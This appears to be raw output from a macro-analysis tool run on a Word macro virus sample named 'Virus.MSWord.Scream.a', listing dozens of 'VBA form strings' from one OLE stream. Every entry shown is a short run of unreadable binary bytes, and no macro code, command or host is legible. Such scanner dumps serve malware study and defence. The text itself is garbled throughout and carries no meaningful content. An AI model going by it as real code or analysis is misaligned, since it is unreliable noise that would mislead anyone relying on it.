VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
44v�a<P��c�:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�84�8���#�A�"��/�:W�G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
19�s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$���l���콽�xNmlM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����[R��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
gv���r���̨s<6��=�T�S[(��ʛMdC/a1����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)ɥ�h��O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q˿εVFDM����ח�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��.k�s��X园5f��>�x�ފL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���GQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���
a�}?U~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֚��0c�Q���mu��K����4;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]1w!�v%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��\����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����J�+c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!��&������1�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y&5�n�(��1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�{���nN�Bs�����HrI�B�M�s��J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�l~��cر�mI����"�ϳ^���[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,u[R|�~�H����tǹ~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;m�F����Q��[{m�F����Q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~BV����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Br&V�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0V��1�%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V\g��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#�kZ3�x��K�i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x��t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ú|�tM��{�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�:��>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ſ���9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9���D7A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+`�lU,�G�	_���%E�/5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U��pܕ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5�Hi�GLw�პ�,%�o�=�K&���)w]3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\x��]��s]�J������J�v�v�x��̎p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k��
���}��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%dI��F<E`d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4R0os<�Zk)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{�S!Y��q��f��0y�Y֝Y]q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
jꤝ���2Wo5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��i����Ǐ��@,����N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-�s�D�$�i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f��!������E$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?��3�D��P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�-ԯx�'���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�1���$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
đ>jv�\%�9n��cZ !
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8S-=b�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j��*g�%\�փ��q�?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�nfo�X��j{m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#\p�d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!������Y�<��)s�5.l-Ǖ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1��wOZ�/�o�͸K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���曋���=�yJ�x�0[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���wG�sX5�b��[�p��CEǄ�Ü��x��ǃ�
�U\'���ǏnV��e��Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
zII��zS���SGRǱ�k�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
);h$�H����#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9iX�H���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^l�K0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1�$��:ln��;�!q�*GD�|x��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_x���&k2ȚZ8p�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�آ{�s��	ʮv��)+��ב_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+<~1�ܦ0]�{�6#y�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u$M��y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
waln��g4���C?F�\�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%?�-�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4톣�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�ʬjx�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}'�V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������k�Ǳc�ړ���*E�f����?Z�1�X궤���ʑ#�o��r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v�ԍ!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U"���ԍ!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U"!�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��r^S�2�g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�xY^2�g�8Zj7����8��c���!m��@�^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5<�kZS>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w�\]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>00S5-�{�-]S�-c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��C����=���c���q�A8��X��~�*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�wq }@(�?B��b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�R�3r�ѷ޲
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
al{ۧ#<�^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��۰��#-��Xƶs�8em�����{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��G4�;%m��j�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�y��淲��c�>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�;�CUQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ߓ�4\�̧w8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Yĳ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2����I+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S@�ٛ�Sx�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R����P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������<�3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���0�89��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2d�s8EI	�"˼d��V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��na,x>^i�P�%���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7>��fƦ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
zw���is�<A5���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p���s���H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ޛ*)IqwH�缧	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a�EXN�H�ց\]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�ѵ��f�|yW%�� �yDa�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�eQ�	]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ޞV�d�p���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#F�1}η���ͤ%͐�Je���[zyD,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F@%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�lA��S+7�-q�?ń�kW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ycn�r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����<�/|�.q'$���8�ڶU�d����`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^8�r^W��ڰ�L!z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Hvk��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŏ�jO��ܩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}�������k�Ǳc�ړ���*D���S�=���N!�oR4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T���oR4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���z���&t2���9��w'
-------------------------------------------------------------------------------
